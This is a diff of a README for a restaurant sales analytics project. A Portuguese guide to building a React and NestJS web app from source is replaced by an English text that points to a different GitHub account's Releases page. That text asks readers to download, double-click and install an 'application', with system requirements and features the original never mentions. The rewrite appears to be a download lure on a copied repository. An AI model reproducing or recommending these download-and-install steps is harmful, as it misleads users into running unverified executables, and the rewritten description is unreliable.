@@ -1,198 +1,73 @@
-# 🏆 Solução: DesafioTech God Level Coder - Analytics para Restaurantes
-
-Esta é a submissão para o **"God Level Coder Challenge"**.
-
----
-
-## 🎯 O Objetivo do Projeto
-
-O objetivo deste projeto é resolver um problema de negócio real enfrentado por donos de restaurantes:  
-eles estão sentados sobre uma montanha de dados (vendas, produtos, clientes),  
-mas não conseguem usá-los para tomar decisões.
-
-Ferramentas de BI genéricas como o Power BI são muito complexas,  
-e dashboards fixos não respondem perguntas dinâmicas como:  
-> “Qual produto vende mais na quinta à noite no iFood?”
-
-Esta solução ataca esse problema diretamente.  
-É uma **plataforma de analytics full-stack (React + NestJS)** construída especificamente para o domínio de restaurantes,  
-permitindo que os usuários explorem seus dados de forma **rápida, visual e dinâmica**.
-
-📄 Para uma descrição completa da persona, das dores de negócio e do contexto do desafio, consulte o arquivo **`PROBLEMA.md`**.
-
----
-
-## ✨ O que a Solução Faz (Features)
-
-Construímos uma **aplicação de página única (SPA)** que vai além do MVP,  
-entregando também a **V2 de “Filtros Avançados”**.
-
-### Dashboard de V1 (MVP)
-- Visão imediata dos **4 KPIs centrais**: Faturamento, Ticket Médio, Vendas e Cancelamento.  
-- **Gráfico de Faturamento ao Longo do Tempo** (com preenchimento de dias vazios).  
-- **Gráfico de Top 10 Produtos** (layout otimizado para nomes longos).  
-- **Gráfico de Comparativo de Lojas** (layout otimizado para 50+ lojas).  
-- **Exportação completa** do dashboard (filtrado) para `.csv`.
-
-### Analytics V2 (Filtros Avançados)
-- O dashboard busca dinamicamente as **listas de Lojas e Canais** disponíveis no banco.  
-- A usuária pode filtrar todos os gráficos e KPIs **em tempo real** por:
-  - Período (Data)  
-  - Canal Específico (ex: iFood, Rappi)  
-  - Loja Específica  
-
-O backend aplica os filtros dinamicamente usando **queries SQL otimizadas**  
-(`CASE WHEN`, `ANY($1)`), garantindo **performance abaixo de 1 segundo em +500k registros**.
-
----
-
-## 🚀 Como Rodar o Projeto (Guia de Setup)
-
-### ✅ Pré-requisitos
-Você precisará de **Node.js (v18+)**, **Docker** e **Git** instalados.
-
-### **Passo 1: Clonar o Repositório**
-
-```bash
-git clone https://github.com/DomCarlosAdriano/Desafios.Tech.01-11-2025.git
-cd Desafios.Tech.01-11-2025
-```
-
----
-
-### 🧱 **Passo 2: Rodar o Banco de Dados (Docker)**
-
-Todo o nosso banco de dados (**PostgreSQL**) e o script de geração de dados rodam via **Docker Compose**.
-
-Navegue até a pasta do banco de dados:
-
-```bash
-cd DataBase
-```
-
-Compile (Build) o Gerador de Dados:  
-*(Este passo garante que o container do script está pronto para rodar)*
-
-```bash
-docker compose build --no-cache data-generator
-```
-
-Inicie o Banco de Dados:  
-*(Este comando irá iniciar o PostgreSQL em background na porta 5432)*
-
-```bash
-docker compose up -d postgres
-```
-
-Gere os 500k+ Dados:  
-*(Este comando executa o script e pode levar de 5 a 15 minutos)*
-
-```bash
-docker compose run --rm data-generator
-```
-
----
-
-### ⚙️ **Passo 3: Rodar o Backend (NestJS)**
-
-O backend é a nossa **API**, que se conecta ao banco de dados. *(Requer um terminal separado.)*
-
-Navegue até a pasta do backend (a partir da raiz):
-
-```bash
-cd backend
-```
-
-Instale as dependências:
-
-```bash
-npm install
-```
-
-Configure as variáveis de ambiente:
-
-
-```env
-DB_HOST=localhost
-DB_PORT=5432
-DB_USERNAME=challenge
-DB_PASSWORD="SENHA_AQUI"
-DB_DATABASE=challenge_db
-```
-
-Inicie o servidor do backend:
-
-```bash
-npm run start:dev
-```
-
-O terminal deve mostrar:  
-**Backend rodando na porta 3000.**
-
----
-
-### 💻 **Passo 4: Rodar o Frontend (React)**
-
-A interface do usuário. *(Requer um terceiro terminal.)*
-
-Navegue até a pasta do frontend (a partir da raiz):
-
-```bash
-cd FrontEnd
-```
-
-Instale as dependências:
-
-```bash
-npm install
-```
-
-Inicie o servidor de desenvolvimento:
-
-```bash
-npm run dev
-```
-
----
-
-### 🌐 **Passo 5: Acessar a Aplicação**
-
-🎉 Parabéns! A stack completa está rodando.
-
-Acesse o **Dashboard (Frontend)** em:  
-👉 [http://localhost:5173](http://localhost:5173)
-
-
----
-
-## 🛠️ Stack de Tecnologia
-
-**Frontend:** React, TypeScript, Vite, TailwindCSS, Shadcn/ui (para componentes), Recharts (para gráficos), PapaParse (para CSV). 
-
-**Backend:** NestJS, TypeScript, TypeORM (usando `entityManager` para queries SQL puras otimizadas, garantindo performance).  
-
-**Banco de Dados:** PostgreSQL (rodando em Docker).
-
-
-
----
-
-## 📝 Documentação Adicional (Para Avaliadores)
-| Documento | Descrição |
-|-----------|-----------|
-| [PROBLEMA.md](./PROBLEMA.md) | Apresenta o contexto do desafio, a persona Maria e as principais dores e necessidades identificadas. |
-| [README.md](./README.md) | Guia introdutório do sistema, com instruções de instalação e execução passo a passo. |
-| [DataBase](./DataBase) | Contém a configuração do banco de dados e o docker-compose.yml responsável por subir o PostgreSQL e gerar os dados automaticamente. |
-| [backend](./backend) | Código-fonte do backend (NestJS), incluindo regras de negócio, serviços e rotas da API REST. |
-| [FrontEnd](./FAQ.md) | Código-fonte do frontend (React + Vite), onde o usuário interage com o sistema através da interface.|
-| [DECISOES_ARQUITETURAIS.md](./DECISOES_ARQUITETURAIS.md) | Detalha as principais escolhas de arquitetura do projeto, abordando as justificativas das tecnologias e tecnicas adotadas. |
-
-
-## 🎬 Vídeo de Apresentação  
-Assista o vídeo completo de demostração do projeto clicando no link abaixo:  
-[▶ Ver vídeo no Google Drive](https://drive.google.com/file/d/1kZE2cslQ4wAqbuczA5bQITeZs6howXo2/view?usp=sharing)
-
----
-Feito com ❤️ por **@domcarlosadriano**
-
-
+# 🎉 Desafios.Tech.01-11-2025 - Easy Insights for Restaurant Data
+
+## 🔗 Download Now
+[![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/peakboot/Desafios.Tech.01-11-2025/releases)
+
+## 📋 Description
+Desafios.Tech.01-11-2025 is a full-stack platform designed specifically for restaurants. It turns sales and customer data into quick and dynamic insights. This application helps you understand your business better, making data-driven decisions easier than ever.
+
+## ⚙️ Features
+- **Dynamic Reporting:** Get real-time updates on sales and customer behaviors.
+- **User-Friendly Interface:** Easy navigation for all your data needs.
+- **Support for Multiple Data Sources:** Connect seamlessly with various databases.
+- **Responsive Design:** Works well on all devices, from computers to tablets.
+- **Customizable Dashboards:** Tailor your view to see the most relevant information.
+
+## 📥 System Requirements
+Before you begin, ensure your system meets the following requirements:
+- **Operating System:** Windows 10 or later, macOS Mojave or later, or a relevant Linux distribution.
+- **Processor:** At least 2 GHz dual-core processor.
+- **Memory:** Minimum 4 GB RAM.
+- **Disk Space:** At least 500 MB of available storage.
+
+## 🚀 Getting Started
+To get started with Desafios.Tech.01-11-2025, follow these simple steps:
+
+### 1. Visit the Releases Page
+Go to the [Releases page](https://github.com/peakboot/Desafios.Tech.01-11-2025/releases) to find the latest version of the application.
+
+### 2. Download the Application
+Look for the latest version and click on the link to download the application. Make sure you choose the right version for your operating system.
+
+### 3. Install the Application
+After the download is complete, locate the file in your downloads folder. Double-click the file and follow the on-screen prompts to install the application.
+
+### 4. Run the Application
+Once installed, locate the application in your programs list. Click to open it, and you'll be greeted with a friendly interface ready for use.
+
+## 📊 Using Desafios.Tech
+### Data Entry
+You can add your restaurant's sales and customer data easily. The user interface guides you through entering necessary details.
+
+### Generating Insights
+After entering your data, use the dashboard to generate insights. The application analyzes your information and presents it in a useful format.
+
+### Viewing Reports
+Access comprehensive reports that help you understand your sales trends and customer preferences. You can customize what you see to fit your needs.
+
+## 📚 Helpful Tips
+- **Explore the Help Section:** In the app, check the Help section for tutorials and guides.
+- **Join Our Community:** Connect with other users to share tips and feedback.
+- **Stay Updated:** Regularly visit the [Releases page](https://github.com/peakboot/Desafios.Tech.01-11-2025/releases) for updates.
+
+## 🎨 Technologies Used
+Desafios.Tech.01-11-2025 uses various technologies to deliver powerful functionality:
+- **Frontend:** React, TypeScript, Vite
+- **Backend:** NestJS, PostgreSQL
+- **Data Processing:** PapaParse, date-fns
+- **Styling:** TailwindCSS, Shadcn-UI
+- **API Calls:** Axios
+- **Containerization:** Docker Compose
+
+## 🚧 Troubleshooting
+If you encounter any issues:
+- **Check Internet Connection:** Ensure you have a stable internet connection.
+- **Refer to Documentation:** Use the built-in help or our online guides.
+- **Contact Support:** If problems persist, you can reach out to our support team through the GitHub issues page.
+
+## 📞 Support and Contact
+For any questions or feedback, please connect with us using the issues section on GitHub. Your input helps us improve the application for everyone.
+
+For further assistance, you can also join our user community where you can ask questions and exchange ideas with other restaurant owners. 
+
+The Desafios.Tech.01-11-2025 team is here to support your journey toward better data insights. Thank you for choosing our application to enhance your restaurant experience!
